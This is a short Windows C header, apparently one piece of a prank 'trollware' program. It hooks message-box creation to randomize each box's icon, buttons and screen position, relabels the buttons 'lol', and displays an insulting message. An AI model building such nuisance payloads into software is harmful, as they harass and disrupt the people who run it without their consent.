#pragma once
#include "main.h"

LPCSTR buttonText = "lol";
LPCSTR caption = "lol";
LPCSTR text = "get fucked";

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam)
{
    CWPRETSTRUCT* msg = (CWPRETSTRUCT*)lParam;

    if (msg->message == WM_INITDIALOG) {
        int X = random() % GetSystemMetrics(SM_CXSCREEN);
        int Y = random() % GetSystemMetrics(SM_CYSCREEN);
        SetWindowPos(msg->hwnd, 0, X, Y, 0, 0,
            SWP_NOZORDER | SWP_NOSIZE | SWP_SHOWWINDOW);
    }

    if (msg->message == WM_INITDIALOG) {
        for (int i = 1; i <= 7; i++) {
            HWND btn = GetDlgItem(msg->hwnd, i);
            SetWindowTextA(btn, buttonText);
        }
    }

    return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD WINAPI ripMessageThread(LPVOID parameter)
{
    HHOOK hook = SetWindowsHookExA(WH_CALLWNDPROCRET, msgBoxHook, 0, GetCurrentThreadId());
    DWORD msg = 0;
    msg += random() % 7;
    msg += (random() % 5) << 4;
    MessageBoxA(NULL, text, caption, msg);
    Sleep(1000);
    UnhookWindowsHookEx(hook);

    return 0;
}
